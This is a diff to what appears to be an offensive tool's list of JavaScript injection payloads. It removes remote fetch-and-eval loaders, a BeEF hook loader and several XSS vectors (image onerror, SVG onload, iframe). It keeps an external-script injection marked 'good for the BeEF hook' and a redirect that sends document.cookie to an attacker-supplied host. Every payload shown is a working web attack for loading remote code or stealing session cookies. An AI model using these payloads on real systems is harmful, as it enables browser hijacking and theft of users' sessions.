@@ -22,26 +22,10 @@ args = parser.parse_args()
 payloads = [
     
     "console.println('JavaScript is running');", "classic log",
-
-    """fetch('https://ARGUMENT/ARGUMENT.js')
-    .then(response => response.text())
-    .then(script => eval(script))
-    .catch(error => console.error('Error loading script:', error));""", "a code in a remote server",
     
-    """fetch('https://ARGUMENT/hook.js')
-    .then(response => response.text())
-    .then(script => eval(script))
-    .catch(error => console.error('Error loading script:', error));""", "the BeEF hook",
-    
-    "<script>alert('XSS!');</script>", "Basic XSS test",
+    "alert('XSS!');", "Basic XSS test",
 
-    """<img src='x' onerror='alert("XSS")'>""", "XSS via image onerror",
-
-    """<svg onload=alert('XSS')>""", "XSS via SVG onload",
-
-    """document.write('<script src="https://ARGUMENT/ARGUMENT.js"></script>');""", "Inject external script",
-
-    """<iframe src="https://ARGUMENT" onload=alert('XSS')></iframe>""", "Malicious iframe injection",
+    """document.write('<script src="https://ARGUMENT/ARGUMENT.js"></script>');""", "Inject external script, good for the BeEF hook",
 
     """window.location='https://ARGUMENT/ARGUMENT?cookie='+document.cookie;""", "Cookie theft via redirection",
 
